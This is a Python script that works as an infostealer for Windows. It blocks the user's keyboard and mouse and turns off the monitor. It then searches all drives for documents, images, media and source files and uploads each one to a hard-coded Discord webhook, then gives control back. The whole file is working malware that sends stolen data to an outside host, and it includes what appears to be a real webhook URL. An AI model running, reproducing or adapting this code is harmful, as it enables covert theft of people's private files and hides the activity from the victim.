import os
import requests
import time
import threading
import ctypes
import win32gui
import win32con

ctypes.windll.user32.BlockInput(True)
ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

# Replace with your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1116644587738497074/xW4tlKgSbjoyUQBCWF3eiETbxNBTz7_t7UEOyqnuJ-1irTx3yyNArxdCJrtP3OCzuA9R"
# Directories to ignore during file search
BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
MAX_FILE_SIZE_MB = 8

def check_file(file_path):
    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif','.mp4','.mp3','.py','.js','.mkv','.docx','.xls']
    max_size_mb = 8
    # skip invalid file type
    if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
        return False
    # skip file sizes too large
    elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
        return False
    # skip files requiring admin privileges
    elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
        return False
    # skip files in blacklisted dir
    elif any(blacklisted_dir in file_path for blacklisted_dir in BLACKLISTED_DIRS):
        return False
    else:
        return True

def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            headers = {"User-Agent": "Mozilla/5.0"}  # Use a user agent to avoid Discord rate limits
            response = requests.post(WEBHOOK_URL, headers=headers, files=files)
            if response.status_code == 429:
                # Rate limit exceeded - wait for the specified time and retry the upload
                time.sleep(response.json()["retry_after"]/1000)
                upload_file(file_path)
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")

def search_files(root_dir):
    for root, dirs, files in os.walk(root_dir):
        if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
            # Skip blacklisted directories
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if check_file(file_path):
                upload_file(file_path)

def thread_files(root_dirs):
    for root_dir in root_dirs:
        search_files(root_dir)
# Get a list of all available drives
drives = ["%s:\\" % d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists("%s:" % d)]
# Split the drives into groups of 4
drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]
# Search for files in each group in parallel
for group in drive_groups:
    threads = []
    for drive in group:
        thread = threading.Thread(target=search_files, args=(drive,))
        threads.append(thread)
        thread.start()
    # Wait for all threads to finish before moving on to the next group
    for thread in threads:
        thread.join()

ctypes.windll.user32.BlockInput(False)
ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)
